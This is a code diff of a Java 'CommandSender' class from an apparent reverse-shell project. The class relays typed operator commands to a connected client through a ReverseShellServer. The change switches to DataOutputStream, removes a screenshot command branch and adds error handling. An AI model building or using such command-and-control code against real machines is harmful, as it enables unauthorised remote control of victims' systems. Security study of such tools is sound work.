@@ -4,12 +4,12 @@ import java.io.*;
 
 public class CommandSender implements Runnable {
 
-    private PrintWriter out;
-    private BufferedReader userInput;
-    private ReverseShellServer server;
+    private final DataOutputStream dataOut;
+    private final BufferedReader userInput;
+    private final ReverseShellServer server;
 
-    public CommandSender(PrintWriter out, BufferedReader userInput, ReverseShellServer server) {
-        this.out = out;
+    public CommandSender(DataOutputStream dataOut, BufferedReader userInput, ReverseShellServer server) {
+        this.dataOut = dataOut;
         this.userInput = userInput;
         this.server = server;
     }
@@ -24,10 +24,6 @@ public class CommandSender implements Runnable {
                     sendCommand("exit");
                     server.cleanup();
                     break;
-                }
-
-                if ("screenshot".equalsIgnoreCase(command)) {
-                    sendCommand("screenshot");
                 } else {
                     sendCommand(command);
                 }
@@ -40,22 +36,26 @@ public class CommandSender implements Runnable {
     }
 
     private void sendCommand(String command) {
-        if (out != null) {
-            out.println(command);
-            out.flush();
-            System.out.println("[-] Command sent: " + command);
-        } else {
-            System.err.println("[ERROR] Output stream is closed. Unable to send command.");
+        try {
+            if (dataOut != null) {
+                dataOut.writeUTF(command);
+                dataOut.flush();
+                System.out.println("[-] Command sent: " + command);
+            } else {
+                System.err.println("[ERROR] Output stream is closed. Unable to send command.");
+            }
+        } catch (IOException e) {
+            System.err.println("[ERROR] Error sending command: " + e.getMessage());
         }
     }
 
     private void cleanup() {
         try {
-            if (out != null) {
-                out.close();
+            if (dataOut != null) {
+                dataOut.close();
                 System.out.println("[-] Output stream closed.");
             }
-        } catch (Exception e) {
+        } catch (IOException e) {
             System.err.println("[ERROR] Error during cleanup: " + e.getMessage());
         }
     }
